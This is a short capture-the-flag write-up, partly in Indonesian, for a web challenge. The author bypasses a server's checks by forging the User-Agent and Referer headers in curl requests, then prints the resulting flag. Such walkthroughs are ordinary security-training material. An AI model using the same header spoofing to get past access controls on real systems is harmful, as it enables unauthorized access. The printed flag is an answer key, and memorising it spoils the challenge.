# Don't Bump Your Head(er) (70 Points)
Try to bypass my security measure on this site! http://165.227.106.113/header.php
# Solved
Cek source nya
```html
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
<!-- Sup3rS3cr3tAg3nt  -->
```
Kemudian jalankan perintah ini
```
$ curl 'http://165.227.106.113/header.php' \
>   -H 'Connection: keep-alive' \
>   -H 'Cache-Control: max-age=0' \
>   -H 'Upgrade-Insecure-Requests: 1' \
>   -H 'User-Agent: Sup3rS3cr3tAg3nt' \
>   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
>   -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8' \
>   --compressed \
>   --insecure
Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
<!-- Sup3rS3cr3tAg3nt  -->
```
Kita dibutuhkan <b>Referer</b> untuk melanjutkannya
```
$ curl 'http://165.227.106.113/header.php' \
>   -H 'Connection: keep-alive' \
>   -H 'Cache-Control: max-age=0' \
>   -H 'Upgrade-Insecure-Requests: 1' \
>   -H 'User-Agent: Sup3rS3cr3tAg3nt' \
>   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
>   -H 'Referer: awesomesauce.com' \
>   -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8' \
>   --compressed \
>   --insecure
Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
<!-- Sup3rS3cr3tAg3nt  -->
```
Flag : <b>flag{did_this_m3ss_with_y0ur_h34d}</b>